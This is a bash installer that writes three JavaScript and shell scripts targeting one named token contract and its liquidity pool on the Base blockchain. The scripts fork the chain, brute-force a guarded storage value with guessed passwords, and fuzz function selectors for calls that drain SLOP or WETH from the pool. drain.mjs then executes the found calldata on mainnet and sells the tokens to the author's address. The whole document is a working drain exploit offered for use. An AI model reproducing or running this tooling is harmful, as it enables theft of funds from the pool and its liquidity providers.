#!/usr/bin/env bash
set -e
cd "$HOME/slop"; mkdir -p out
npm ls ethers >/dev/null 2>&1 || npm i ethers --no-audit --no-fund >/dev/null 2>&1

cat > forkrecon.mjs <<'JS'
import fs from "node:fs";
import { JsonRpcProvider, AbiCoder, Interface, Contract, keccak256, toUtf8Bytes,
  solidityPacked, MaxUint256, ZeroAddress, formatUnits, getAddress } from "ethers";
const ME="0xA4BC81CecCC9D8637147Fa4b5daAf55E8f9Ef33f";
const T="0xA5a3A7a1dec1a57E41A0Cdd8c2129CfD7B46b592";
const PAIR="0x69249e64fd8D35036965fa09FadAEdb955D70C31";
const WETH="0x4200000000000000000000000000000000000006";
const MC3="0xcA11bde05977b3631167028862bE2a173976CA11";
const ABI=AbiCoder.defaultAbiCoder();
const MCI=new Interface(["function tryAggregate(bool,tuple(address target,bytes callData)[])"]);
const DIR=process.env.HOME+"/slop/out";
const log=s=>{console.log(s);fs.appendFileSync(DIR+"/fork.log",s+"\n")};
const pad=v=>v.replace(/^0x/,"").padStart(64,"0");
const balD=a=>"0x70a08231"+pad(a);
const p=new JsonRpcProvider("http://127.0.0.1:8545",8453,{staticNetwork:true});
const rpc=async(m,ps)=>{for(const pre of ["anvil_","hardhat_",""]){try{return await p.send(pre+m,ps)}catch{}}throw new Error("rpc "+m)};
const fund=async a=>{await rpc("impersonateAccount",[a]);await rpc("setBalance",[a,"0x21e19e0c9bab2400000"])};
const snap=()=>rpc("evm_snapshot",[]);
const rev=id=>rpc("evm_revert",[id]);
const bal=async(t,w)=>{try{return BigInt(await p.call({to:t,data:balD(w)}))}catch{return 0n}};
const sim=async(calls,from)=>{const d=MCI.encodeFunctionData("tryAggregate",[false,calls.map(c=>[c.target,c.data])]);
  const raw=await p.call({to:MC3,data:d,from,gasLimit:60_000_000});
  return MCI.decodeFunctionResult("tryAggregate",raw)[0].map(r=>({ok:r[0],ret:r[1]}))};

const bn=await p.getBlockNumber(); log("fork block: "+bn);
const code=await p.getCode(T); fs.writeFileSync(DIR+"/bytecode.txt",code);
log("bytecode: "+(code.length-2)/2);
const h=code.slice(2), sels=new Set();
for(let i=0;i<h.length-10;i+=2) if(h.slice(i,i+2)==="63") sels.add("0x"+h.slice(i+2,i+10));
sels.delete("0x00000000"); sels.delete("0xffffffff");
const st=[]; for(let i=0;i<320;i++){const v=await p.getStorage(T,i); if(!/^0x0+$/.test(v)) st.push(v)}
const stAddrs=[...new Set(st.filter(v=>/^0x0{24}[0-9a-f]{40}$/.test(v)).map(v=>getAddress("0x"+v.slice(-40))))];
const GATE=await p.getStorage(T,26);
log("selectors="+sels.size+" slots="+st.length+" addrs="+stAddrs.join(","));

const WORDS=["slop","Slop","SLOP","slopcash","SlopCash","Slop Cash","SLOP CASH","slopiscash",
 "SLOP IS CASH","cash","secret","password","admin","123","1234","123456","base","umia","shaw",
 "eliza","elizaos","slop123","slopcash123","test","moon","slop2026","dead","222","gslop","virgen"];
const salts=[ME,...stAddrs,ZeroAddress,T,PAIR];
let gate=null;
for(const w of WORDS){const s=[[keccak256(toUtf8Bytes(w)),w]];
  for(const a of salts){s.push([keccak256(solidityPacked(["address","string"],[a,w])),a+"+"+w]);
    s.push([keccak256(solidityPacked(["string","address"],[w,a])),w+"+"+a])}
  for(const [k,v] of s) if(k.toLowerCase()===GATE.toLowerCase()){gate=v;log(">>> GATE "+v)}}
for(const a of salts) if(keccak256(solidityPacked(["address"],[a])).toLowerCase()===GATE.toLowerCase()){gate=a;log(">>> GATE addr "+a)}

const rS=await bal(T,PAIR), rW=await bal(WETH,PAIR);
const price=rS?rW*10n**9n/rS:0n;
log(`POOL SLOP=${formatUnits(rS,9)} WETH=${formatUnits(rW,18)}`);
const F=(n,t,f)=>({n,t,f});
const forms=[F("()",[],()=>[]),F("(addr)",["address"],s=>[s]),
 F("(addr,max)",["address","uint256"],s=>[s,MaxUint256]),F("(addr,pairBal)",["address","uint256"],s=>[s,rS]),
 F("(max)",["uint256"],()=>[MaxUint256]),F("(0)",["uint256"],()=>[0n]),F("(true)",["bool"],()=>[true]),
 F("(pair)",["address"],()=>[PAIR]),F("(gate)",["bytes32"],()=>[GATE]),
 F("(gate,addr)",["bytes32","address"],s=>[GATE,s]),F("(addr,pair)",["address","address"],s=>[s,PAIR]),
 F("(pair,max)",["address","uint256"],()=>[PAIR,MaxUint256]),
 F("(addr,pair,max)",["address","address","uint256"],s=>[s,PAIR,MaxUint256])];
const senders=[...new Set([ME,...stAddrs,ZeroAddress])];
const hits=[], list=[...sels], MAX=2n**256n-1n;
for(const from of senders){
  await fund(from);
  for(const f of forms){ for(let i=0;i<list.length;i+=6){
    const g=list.slice(i,i+6), calls=[], meta=[];
    calls.push({target:T,data:"0x095ea7b3"+pad(T)+pad(MAX.toString(16))});
    calls.push({target:T,data:"0x095ea7b3"+pad(PAIR)+pad(MAX.toString(16))});
    for(const s of g){let d;try{d=s+ABI.encode(f.t,f.f(from)).slice(2)}catch{continue}
      calls.push({target:T,data:d},{target:T,data:balD(PAIR)},{target:WETH,data:balD(PAIR)},{target:T,data:balD(from)});
      meta.push({s,d})}
    if(!meta.length) continue;
    const id=await snap(); let res; try{res=await sim(calls,from)}catch{await rev(id);continue}
    let pS=rS,pW=rW;
    for(let k=0;k<meta.length;k++){
      const pr=res[2+k*4], aS=BigInt(res[3+k*4].ret||0), aW=BigInt(res[4+k*4].ret||0), aB=BigInt(res[5+k*4].ret||0);
      if(pr.ok&&(aS<pS||aW<pW)){const got=pS-aS, wl=pW-aW;
        const sc=wl+got*price/10n**9n;
        const d=`pairSLOP -${formatUnits(got,9)} | pairWETH -${formatUnits(wl,18)} | لك ${formatUnits(aB,9)}`;
        hits.push({sel:meta[k].s,form:f.n,from,calldata:meta[k].d,delta:d,score:String(sc)});
        log(`>>> HIT ${meta[k].s} ${f.n} from=${from} ${d}`)}
      pS=aS;pW=aW}
    await rev(id);
  }}
}
hits.sort((a,b)=>BigInt(b.score)>BigInt(a.score)?1:-1);
fs.writeFileSync(DIR+"/hits.json",JSON.stringify({gate,hits},null,2));
log("\nHITS: "+hits.length);

if(hits.length){
  const b=hits[0];
  log(`\n== سحب كامل: ${b.sel} as ${b.from} ==`);
  const sgn=await p.getSigner(b.from);
  try{
    const r=await (await sgn.sendTransaction({to:T,data:b.calldata,gasLimit:3_000_000})).wait();
    log("status: "+r.status);
    const tok=new Contract(T,["function balanceOf(address) view returns(uint256)","function transfer(address,uint256) returns(bool)"],sgn);
    let amt=await tok.balanceOf(b.from); log("SLOP عند المرسل: "+formatUnits(amt,9));
    if(b.from.toLowerCase()!==ME.toLowerCase()&&amt>0n){await (await tok.transfer(ME,amt)).wait(); amt=await tok.balanceOf(ME)}
    if(amt>0n){
      const me=await p.getSigner(ME);
      const pr=new Contract(PAIR,["function token0() view returns(address)","function getReserves() view returns(uint112,uint112,uint32)","function swap(uint256,uint256,address,bytes)","function skim(address)"],me);
      const z=await pr.token0(), s0=z.toLowerCase()===T.toLowerCase(), b0=await bal(T,PAIR);
      await (await tok.transfer(PAIR,amt)).wait();
      const net=(await bal(T,PAIR))-b0, R=await pr.getReserves();
      const Ri=s0?R[1]:R[0], Ro=s0?R[0]:R[1];
      const out=(net*997n*Ro)/(Ri*1000n+net*997n)*995n/1000n;
      await (await pr.swap(s0?0n:out,s0?out:0n,ME,"0x")).wait();
      try{await (await pr.skim(ME)).wait()}catch{}
      log("WETH النهائي: "+formatUnits(await bal(WETH,ME),18));
    }
  }catch(e){log("فشل التنفيذ: "+(e.shortMessage||e.message))}
  log("\nللمين نت: cast send "+T+" \""+b.calldata+"\" --private-key $PK --rpc-url https://mainnet.base.org");
}
process.exit(0);
JS

cat > fork.sh <<'SH'
#!/usr/bin/env bash
cd "$HOME/slop"; mkdir -p out
pkill -f "anvil --fork" 2>/dev/null; pkill -f "hardhat node" 2>/dev/null; sleep 1
if command -v anvil >/dev/null; then
  nohup anvil --fork-url "${RPC:-https://mainnet.base.org}" --chain-id 8453 --port 8545 --auto-impersonate --silent > out/node.log 2>&1 &
elif [ -f "$HOME/hh/hardhat.config.js" ]; then
  cd "$HOME/hh"; nohup npx hardhat node --port 8545 --hostname 127.0.0.1 > "$HOME/slop/out/node.log" 2>&1 &
else
  echo "لا anvil ولا hardhat جاهزين. نفّذ: pkg install -y foundry"; exit 1
fi
for i in $(seq 1 60); do
  cast chain-id --rpc-url http://127.0.0.1:8545 >/dev/null 2>&1 && break; sleep 1
done
cd "$HOME/slop"
cast chain-id --rpc-url http://127.0.0.1:8545 || { echo "الفورك فشل:"; tail -20 out/node.log; exit 1; }
echo "fork ok, block $(cast block-number --rpc-url http://127.0.0.1:8545)"
node forkrecon.mjs
SH

cat > drain.mjs <<'JS'
import { JsonRpcProvider, Wallet, Contract, formatUnits } from "ethers";
const ME="0xA4BC81CecCC9D8637147Fa4b5daAf55E8f9Ef33f";
const T="0xA5a3A7a1dec1a57E41A0Cdd8c2129CfD7B46b592";
const PAIR="0x69249e64fd8D35036965fa09FadAEdb955D70C31";
const WETH="0x4200000000000000000000000000000000000006";
const p=new JsonRpcProvider(process.env.RPC||"https://mainnet.base.org",8453,{staticNetwork:true});
const bal=async(t,w)=>{try{return BigInt(await p.call({to:t,data:"0x70a08231"+w.replace(/^0x/,"").padStart(64,"0")}))}catch{return 0n}};
const m=process.argv[2];
if(m==="check"){console.log("ETH",formatUnits(await p.getBalance(ME),18),"SLOP",formatUnits(await bal(T,ME),9),"WETH",formatUnits(await bal(WETH,ME),18))}
if(m==="exec"){
  const w=new Wallet(process.env.PK,p);
  const est=await p.estimateGas({from:ME,to:T,data:process.argv[3]});
  const f=await p.getFeeData();
  const r=await (await w.sendTransaction({to:T,data:process.argv[3],gasLimit:est*130n/100n,maxFeePerGas:f.maxFeePerGas,maxPriorityFeePerGas:f.maxPriorityFeePerGas})).wait();
  console.log("status",r.status,"gasUsed",r.gasUsed);
}
if(m==="sell"){
  const w=new Wallet(process.env.PK,p);
  const tok=new Contract(T,["function balanceOf(address) view returns(uint256)","function transfer(address,uint256) returns(bool)"],w);
  const pr=new Contract(PAIR,["function token0() view returns(address)","function getReserves() view returns(uint112,uint112,uint32)","function swap(uint256,uint256,address,bytes)","function skim(address)"],w);
  const amt=await tok.balanceOf(ME); console.log("SLOP",formatUnits(amt,9));
  if(amt>0n){
    const z=await pr.token0(), s0=z.toLowerCase()===T.toLowerCase(), b0=await bal(T,PAIR);
    await (await tok.transfer(PAIR,amt)).wait();
    const net=(await bal(T,PAIR))-b0, R=await pr.getReserves();
    const Ri=s0?R[1]:R[0], Ro=s0?R[0]:R[1];
    const out=(net*997n*Ro)/(Ri*1000n+net*997n)*995n/1000n;
    console.log("out",formatUnits(out,18),"WETH");
    await (await pr.swap(s0?0n:out,s0?out:0n,ME,"0x")).wait();
    try{await (await pr.skim(ME)).wait()}catch{}
    console.log("WETH الآن",formatUnits(await bal(WETH,ME),18));
  }
}
process.exit(0);
JS
chmod +x fork.sh
echo "تم تثبيت: forkrecon.mjs fork.sh drain.mjs"
